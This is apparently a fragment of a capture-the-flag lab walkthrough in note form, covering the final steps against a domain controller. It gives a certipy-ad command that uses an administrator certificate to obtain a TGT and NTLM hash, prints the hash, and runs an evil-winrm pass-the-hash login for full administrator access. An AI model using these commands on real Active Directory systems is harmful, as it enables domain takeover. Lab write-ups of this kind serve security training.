#Attacking_machine 
TGT and NTLM hash retrieval.


```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <IP_Machine>
```

![[administrator_hash.png]]

Administrator's hash: '*a773cb05d79273299a684a23ede56748*'

#Attaking_machine 
Connect via WinRM

```BASH
evil-winrm -i 10.129.244.72 -u 'administrator' -H 'a773cb05d79273299a684a23ede56748'
```

![[dc01_winRM.png]]

> [!Success]
> Full access to the DC as FRIES\Administrator]

**Next step:** [[Flag Retrieval]]
